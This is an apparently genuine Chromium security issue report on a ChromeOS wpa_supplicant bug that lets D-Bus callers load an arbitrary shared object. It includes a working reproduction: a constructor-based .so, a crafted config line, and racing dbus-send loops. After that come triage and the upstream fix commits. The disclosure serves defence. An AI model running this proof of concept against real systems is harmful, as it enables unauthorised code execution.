# Security: ChromeOS wpa_supplicant arbitrary shared object load

| Field | Value |
|-------|-------|
| **Issue ID** | [40062113](https://issues.chromium.org/issues/40062113) |
| **Status** | Accepted |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Unknown |
| **Platforms** | ChromeOS |
| **Reporter** | ro...@rorym.cnamara.com |
| **Assignee** | dr...@chromium.org |
| **Created** | 2022-12-07 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Dbus callers of wpa\_supplicant CreateInterface (users root, wpa, shill) can induce wpa\_supplicant to load a shared object by defining it in a new configuration file and passing the file to CreateInterface. A separate wpa\_supplicant dbus caller (any user) can inject a file descriptor into the wpa\_supplicant file descriptor table to allow for the specification of arbitrary shared objects to be loaded.

**VERSION**  

Google Chrome 107.0.5304.110 (Official Build) (64-bit)  

Revision 2a558545ab7e6fb8177002bf44d4fc1717cb2998-refs/branch-heads/5304@{#1202}  

Platform 15117.112.0 (Official Build) stable-channel eve  

Firmware Version Google\_Eve.9584.230.0

**REPRODUCTION CASE**  

Compile the following C code to /usr/local/bin/so.so with "gcc so.c -o so.so -fPIC -shared"

#include <sys/stat.h>  

#include <fcntl.h>  

#include <unistd.h>  

#include <stdio.h>  

void **attribute**((constructor)) so\_main() {  

int fd = creat("/tmp/hello\_from\_wpa\_supplicant", 0444);  

dprintf(fd, "Hello from wpa\_supplicant! pid: %d, uid: %d\n", getpid(), getuid());  

close(fd);  

}

Create the file /tmp/wpa\_config with the following line:  

opensc\_engine\_path=/proc/self/fd/30

In one shell execute the following two commands:  

exec 3</usr/local/bin/so.so  

until [ -e /tmp/hello\_from\_wpa\_supplicant ]; do dbus-send --print-reply --system --dest=fi.w1.wpa\_supplicant1 /fi/w1/wpa\_supplicant1 org.freedesktop.DBus.Properties.GetAll string:fi.w1.wpa\_supplicant1 $(for i in {1..16}; do echo fd:3; done);done

In a second shell execute the following command:  

until [ -e /tmp/hello\_from\_wpa\_supplicant ]; do sudo dbus-send --print-reply --system --dest=fi.w1.wpa\_supplicant1 /fi/w1/wpa\_supplicant1 fi.w1.wpa\_supplicant1.CreateInterface dict:string:variant:Ifname,string:lo,ConfigFile,string:/tmp/wpa\_config,Driver,string:wired; done

Upon successful race completion, both commands will exit, and the file /tmp/hello\_from\_wpa\_supplicant will exist showing the successful execution of arbitrary code in wpa\_supplicant

DETAILS  

The ConfigFile argument to the CreateInterface dbus interface can be used to load an arbitrary configuration file from /tmp. The following configuration items can be used to load arbitrary shared objects:

load\_dynamic\_eap  

opensc\_engine\_path  

pkcs11\_engine\_path  

pkcs11\_module\_path

Dbus does not reject excessive parameters to wpa\_supplicant Properties.GetAll calls, so excessive file descriptors are forwarded to the wpa\_supplicant's file descriptor table, which will then return an error message and close all the new file descriptors. There is a race condition here where the CreateInterface method is called at the same time as Properties.GetAll, resulting in a valid /proc/self/fd/X file descriptor being loaded by wpa\_supplicant as a shared object.

A shared object with a constructor passed as the fd to Properties.GetAll will therefore be loaded and executed as wpa\_supplicant.

Requirements

- Permission to call fi.w1.wpa\_supplicant1.CreateInterface on the wpa\_supplicant dbus (currently users root, wpa, shill)
- An fd to an executable .so (e.g an executable mount or memfd)

Impact

- Code execution as user 'wpa', with cap\_net\_admin and cap\_net\_raw

Recommendation

- Disable shared object loading in wpa\_supplicant

## Timeline

### [Deleted User] (2022-12-07)

[Empty comment from Monorail migration]

### ad...@google.com (2022-12-07)

[Empty comment from Monorail migration]

### be...@google.com (2022-12-07)

[Empty comment from Monorail migration]

### be...@google.com (2022-12-07)

[Empty comment from Monorail migration]

### be...@google.com (2022-12-07)

[Empty comment from Monorail migration]

### ej...@chromium.org (2022-12-07)

[Empty comment from Monorail migration]

### no...@chromium.org (2022-12-07)

Adding druth@ who has agreed to be the point of contact on the WiFi team

### ma...@google.com (2022-12-08)

The report says that if we have root, wpa, or shill user permissions, we can follow the above repro steps and execute arbitrary code as wpa user (CAP_NET_ADMIN|CAP_NET_RAW), but all three of those users already have CAP_NET_ADMIN|CAP_NET_RAW, so there's minimal to no impact here and it's P2 at best.

### ma...@google.com (2022-12-08)

[Empty comment from Monorail migration]

### le...@google.com (2022-12-09)

[Empty comment from Monorail migration]

[Monorail components: Security]

### [Deleted User] (2022-12-09)

[Empty comment from Monorail migration]

### le...@google.com (2022-12-12)

[Empty comment from Monorail migration]

### [Deleted User] (2022-12-12)

[Empty comment from Monorail migration]

### dr...@chromium.org (2023-03-01)

I've analysed the issue and want to provide an update.

Disabling shared object loading entirely is not feasible.  In order to support EAP authentication mechanisms that interact with machine certificates stored in the TPM, wpa_supplicant must be able to load share object code that allows it to interact with the TPM (in the case of ChromeOS, this is the chaps client).  My initial thought is to work on a way to prevent providing a configuration file or parameters over D-Bus, as I am fairly certain that this functionality is not used in ChromeOS.  My hope is that putting this functionality behind a flag would make it feasible to disable this functionality and remain compatible with upstream.  I think that I should be able to write the patch within the next two weeks.

### ma...@google.com (2023-03-01)

Thanks David!

### ma...@google.com (2023-03-09)

[Empty comment from Monorail migration]

### dr...@chromium.org (2023-04-04)

I've sent a patch upstream to fix this issue: https://patchwork.ozlabs.org/project/hostap/patch/20230404233535.3084185-1-druth@chromium.org/.  Once that review is complete, it's ready to go into the chromium tree.

### dr...@chromium.org (2023-04-18)

Update: The upstream patch is still waiting for review.

### dr...@chromium.org (2023-05-10)

Update: The upstream patch is still waiting for review.

### dr...@chromium.org (2023-05-22)

Update: The patch is still waiting for upstream review.

### ch...@google.com (2023-05-24)

[Empty comment from Monorail migration]

### dr...@chromium.org (2023-06-12)

Update: The patch is still waiting for upstream review.

### dr...@chromium.org (2023-06-21)

Update: This patch is still waiting on upstream review.  I will work on getting a chromium version committed with an upstream tracking task at this point. I am hoping I'll get to it in the next two weeks.

### ch...@google.com (2023-07-26)

Dear druth@chromium.org,

Do you already have some updates ? 

### dr...@chromium.org (2023-07-26)

Apologies, I've been bogged down with P0s for the past few weeks.  Once those are finished, I'll get to this.  ETA would be towards the end of next week, but if I'm really lucky tomorrow.

### ch...@google.com (2023-08-01)

So many thanks for your update! ETA sounds perfect! 

### gi...@appspot.gserviceaccount.com (2023-08-02)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromiumos/platform2/+/91d6bece6a67b5572b31ceee51009f78601cf677

commit 91d6bece6a67b5572b31ceee51009f78601cf677
Author: David Ruth <druth@chromium.org>
Date: Tue Mar 14 22:36:10 2023

shill: Remove libraries to load for wpa_supplicant.

Now that these modules are configured elsewhere, they don't need to be
specified here.

BUG=chromium:1398996
TEST=emerge-$BOARD shill
TEST=cros deploy $DUT shill
TEST=tast run -var "router=$ROUTER" -var "pcap="$PCAP" $DUT wifi.SimpleConnect.*eap*

Cq-Depend: chromium:4338721, chromium:4734139
Change-Id: I8f051cd467fa7d4ca161a7b7b3e9a6ec44def1b8
Reviewed-on: https://chromium-review.googlesource.com/c/chromiumos/platform2/+/4338412
Tested-by: David Ruth <druth@chromium.org>
Reviewed-by: Matthew Wang <matthewmwang@chromium.org>
Commit-Queue: David Ruth <druth@chromium.org>

[modify] https://crrev.com/91d6bece6a67b5572b31ceee51009f78601cf677/shill/shims/wpa_supplicant.conf.in


### gi...@appspot.gserviceaccount.com (2023-08-02)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromiumos/overlays/chromiumos-overlay/+/6b719ffd09486502ffcd2d7947a0d1b8e21f6527

commit 6b719ffd09486502ffcd2d7947a0d1b8e21f6527
Author: David Ruth <druth@chromium.org>
Date: Tue Mar 14 20:27:42 2023

wpa_supplicant-cros: Hardcode libp11 library paths.

This change hardcodes the libp11 library paths that wpa_supplicant loads
in order to interact with the TPM in 8021x connections.  This prevents
the ability to load other libraries dynamically through config changes.

BUG=chromium:1398996
TEST=emerge-$BOARD wpa_supplicant-cros
TEST=cros deploy $DUT wpa_supplicant-cros
TEST=tast run $DUT wifi.SimpleConnect.*eap*

Cq-Depend: chromium:4734139, chromium:4338412
Change-Id: I5ac7dd9c14275558d161fab5aa22d505f2fff815
Reviewed-on: https://chromium-review.googlesource.com/c/chromiumos/overlays/chromiumos-overlay/+/4338721
Tested-by: David Ruth <druth@chromium.org>
Reviewed-by: Jintao Lin <jintaolin@chromium.org>
Reviewed-by: Matthew Wang <matthewmwang@chromium.org>
Commit-Queue: David Ruth <druth@chromium.org>

[modify] https://crrev.com/6b719ffd09486502ffcd2d7947a0d1b8e21f6527/net-wireless/wpa_supplicant-cros/wpa_supplicant-cros-9999.ebuild


### gi...@appspot.gserviceaccount.com (2023-08-02)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromiumos/third_party/hostap/+/f02f2715ff3ec0af783be4da9e6961b11a553977

commit f02f2715ff3ec0af783be4da9e6961b11a553977
Author: David Ruth <druth@chromium.org>
Date: Tue Mar 14 20:36:42 2023

FROMLIST: Compile-time config for libraries.

Prevent loading arbitrary executable code based on config at runtime,
while allowing libraries to be specified at compile time when they are
known in advance.

* Add the ability to configure libraries to load at compile time.
	* CONFIG_PKCS11_ENGINE_PATH - pkcs11_engine library location.
	* CONFIG_PKCS11_MODULE_PATH - pkcs11_module library location.
	* CONFIG_OPENSC_ENGINE_PATH - opensc_engine library location.
* Add flags with the ability to set each of the libraries to NULL and
  prevent loading them at runtime.
  	* CONFIG_NO_PKCS11_ENGINE_PATH - prevents loading pkcs11_engine
	  library.
	* CONFIG_NO_PKCS11_MODULE_PATH - prevents loading pkcs11_module
	  library.
	* CONFIG_NO_OPENSC_ENGINE_PATH - prevents loading opensc_engine
	  library.
	* CONFIG_NO_LOAD_DYNAMIC_EAP - prevents loading eap libraries at
	  runtime.
Signed-off-by: David Ruth <druth@chromium.org>
(am from https://patchwork.ozlabs.org/patch/1765240/)
(also found at
https://marc.info?i=20230404233535.3084185-1-druth@chromium.org)

BUG=chromium:1398996
TEST=emerge-$BOARD wpa_supplicant-cros
TEST=cros deploy $DUT wpa_supplicant-cros
TEST=tast run -var "router=$ROUTER" -var "pcap=$PCAP" $DUT wifi.SimpleConnect.*eap*

Cq-Depend: chromium:4338721, chromium:4338412
Change-Id: I7b03e7eadba2407bed19662ef5ddac578b2d8d94
Reviewed-on: https://chromium-review.googlesource.com/c/chromiumos/third_party/hostap/+/4734139
Tested-by: David Ruth <druth@chromium.org>
Reviewed-by: Matthew Wang <matthewmwang@chromium.org>
Reviewed-by: Sean Paul <sean@poorly.run>
Commit-Queue: David Ruth <druth@chromium.org>

[modify] https://crrev.com/f02f2715ff3ec0af783be4da9e6961b11a553977/wpa_supplicant/wpa_supplicant.c
[modify] https://crrev.com/f02f2715ff3ec0af783be4da9e6961b11a553977/wpa_supplicant/dbus/dbus_new_handlers.c
[modify] https://crrev.com/f02f2715ff3ec0af783be4da9e6961b11a553977/src/crypto/tls_openssl.c
[modify] https://crrev.com/f02f2715ff3ec0af783be4da9e6961b11a553977/wpa_supplicant/config.h
[modify] https://crrev.com/f02f2715ff3ec0af783be4da9e6961b11a553977/wpa_supplicant/Makefile
[modify] https://crrev.com/f02f2715ff3ec0af783be4da9e6961b11a553977/wpa_supplicant/config_file.c
[modify] https://crrev.com/f02f2715ff3ec0af783be4da9e6961b11a553977/src/eapol_supp/eapol_supp_sm.h
[modify] https://crrev.com/f02f2715ff3ec0af783be4da9e6961b11a553977/wpa_supplicant/wpas_glue.c
[modify] https://crrev.com/f02f2715ff3ec0af783be4da9e6961b11a553977/src/eapol_supp/eapol_supp_sm.c
[modify] https://crrev.com/f02f2715ff3ec0af783be4da9e6961b11a553977/src/crypto/tls.h
[modify] https://crrev.com/f02f2715ff3ec0af783be4da9e6961b11a553977/src/eap_peer/eap.c
[modify] https://crrev.com/f02f2715ff3ec0af783be4da9e6961b11a553977/wpa_supplicant/config.c


### dr...@chromium.org (2023-08-02)

All pertinent changes have been submitted.

### [Deleted User] (2023-08-02)

[Empty comment from Monorail migration]

### [Deleted User] (2023-08-03)

[Empty comment from Monorail migration]

### dr...@chromium.org (2023-08-04)

[Empty comment from Monorail migration]

### am...@chromium.org (2023-09-26)

[Empty comment from Monorail migration]

### [Deleted User] (2023-11-08)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ch...@google.com (2023-12-06)

[Empty comment from Monorail migration]

### am...@google.com (2023-12-08)

[Empty comment from Monorail migration]

### is...@google.com (2023-12-08)

This issue was migrated from crbug.com/chromium/1398996?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40062113)*
